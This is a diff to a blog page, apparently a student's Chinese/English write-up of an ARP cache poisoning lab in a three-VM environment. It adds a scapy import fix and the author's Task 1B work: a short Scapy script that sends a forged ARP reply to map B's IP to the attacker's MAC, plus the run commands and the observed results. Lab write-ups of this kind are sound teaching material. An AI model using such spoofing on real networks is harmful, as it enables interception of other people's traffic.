@@ -110,6 +110,15 @@
 <p>以上程序构建并发送了一个ARP包。请设置必要的属性名称/值来定义你自己的ARP数据包。我们可以使用ls(ARP)来查看ARP类中的属性名称。如果字段没有设置，则将使用默认的值（参考输出的第三列）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls(ARP)</span><br><span class="line">hwtype			: XShortField				= (<span class="number">1</span>)</span><br><span class="line">ptype			: XShortEnumField			= (<span class="number">2048</span>)</span><br><span class="line">hwlen			: ByteField					= (<span class="number">6</span>)</span><br><span class="line">plen			: ByteField					= (<span class="number">4</span>)</span><br><span class="line">op				: ShortEnumField			= (<span class="number">1</span>)</span><br><span class="line">hwsrc			: ARPSourceMACField			= (<span class="literal">None</span>)</span><br><span class="line">psrc			: SourceIPField				= (<span class="literal">None</span>)</span><br><span class="line">hwdst			: MACField					= (<span class="string">'00:00:00:00:00:00'</span>)</span><br><span class="line">pdst			: IPField					= (<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>注：在实验环境中，输入python，再输入上述内容是没有问题的。但是，如果输入python3，则会报错<code>ImportError: No module named &#39;scapy&#39;</code>，对于该问题的<a href="https://stackoverflow.com/questions/46602880/importerror-no-module-named-scapy-all" target="_blank" rel="noopener">解决方案</a>如下，注意下面方法是用于python2的，而不是python3。</p>
+<p><code>ImportError: No module..</code> found error happens when Python doesn’t find your module. So, where does it look for modules?</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> os</span><br><span class="line">&gt; <span class="keyword">print</span> os.sys.path</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>Verify <code>/usr/local/lib/python2.7/site-packages</code> is in that list. If not, append it</p>
+<p><code>os.sys.path.append(&#39;/usr/local/lib/python2.7/site-packages&#39;)</code> and try to load it. If that still doesn’t work, try re-installing the module, because it seems there is an issue there.</p>
+</blockquote>
 <p>In this task, we have three VMs, A, B, and M. We would like to attack A’s ARP cache, such that the following results is achieved in A’s ARP cache.</p>
 <p>在该实验中，我们将需要3台VM，即A,B和M。我们想要攻击A的ARP缓存，以便在A的ARP缓存中实现以下结果。</p>
 <p><code>B’s IP address --&gt; M’s MAC address</code></p>
@@ -118,10 +127,40 @@
 <ul>
 <li><p><strong>Task 1A (using ARP request).</strong> On host M, construct an ARP request packet and send to host A. Check whether M’s MAC address is mapped to B’s IP address in A’s ARP cache.</p>
 <p><strong>任务1A（使用ARP请求）</strong>在主机M，构建一个ARP请求包并发送给主机A。检测是否在A的ARP缓存表中有B的IP地址映射了M的MAC地址。</p>
+<blockquote>
+</blockquote>
 <br>
 </li>
 <li><p><strong>Task 1B (using ARP reply).</strong> On host M, construct an ARP reply packet and send to host A. Check whether M’s MAC address is mapped to B’s IP address in A’s ARP cache.</p>
 <p><strong>任务1B（使用ARP回应）</strong>在主机M，构建一个ARP回应包并发送到主机A。检测是否在A的ARP缓存表中有B的IP地址映射了M的MAC地址。</p>
+<blockquote>
+<ol>
+<li><p>我在主机M（即linux2）上，创建了zhangshuaiyang3文件夹，然后再在该文件夹下创建了ARP-Cache-Poisoning文件夹。在ARP-Cache-Poisoning文件夹下，创建了文件task1A.py </p>
+</li>
+<li><p>文件task1A.py 中的python代码如下</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">#spoof A,so we need A'mac</span></span><br><span class="line">&gt; E = Ether(dst=<span class="string">"08:00:27:04:d9:58"</span>)</span><br><span class="line">&gt; <span class="comment">#src is B,dst is A,but now i'm in M</span></span><br><span class="line">&gt; A = ARP(op = <span class="string">"is-at"</span>,psrc=<span class="string">"10.0.2.5"</span>,pdst=<span class="string">"10.0.2.15"</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; pkt = E/A</span><br><span class="line">&gt; sendp(pkt)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<ol start="3">
+<li><p>接下来，我在主机A（即linux1）上，清除了arp缓存表<code>sudo ip neigh flush dev enp0s3</code></p>
+</li>
+<li><p>清除完后，再在主机M上，执行task1A.py文件。<code>sudo ./task1A.py</code></p>
+</li>
+<li><p>再次查看主机A的arp缓存表，可以发现，主机B的mac地址已经变成主机C的mac了</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/2.png" title="This is an test image">
+</li>
+<li><p>同时，在主机A上，你也可以用wireshark看到主机M发出的ARP回应报文</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/3.png" title="This is an test image">
+</li>
+<li><p>然后我们再在A上pingB的IP，理论来说应该是ping不通的。因为A的数据包交给了M</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/4.png" title="This is an test image">
+</li>
+<li><p>但是从上图可知，开始虽然不通，但最终还是能ping通的。从wireshark截图中，我们就可以发现原因。虽然最开始3个ping包没有回应，但是主机A发现ping不通的时候，又重新发起了ARP请求，请求主机B的mac，并且收到了B的回应，这将导致A的ARP缓存表的更新。所以ping请求包后续封装的目的MAC地址又是正确的了，所以就能ping通。</p>
+</li>
+</ol>
+</blockquote>
 <br>
 </li>
 <li><p><strong>Task 1C (using ARP gratuitous（免费） message).</strong> On host M, construct an ARP gratuitous packets. ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to update outdated（过时） information on all the other machine’s ARP cache. The gratuitous ARP packet has the following characteristics（特性）:</p>
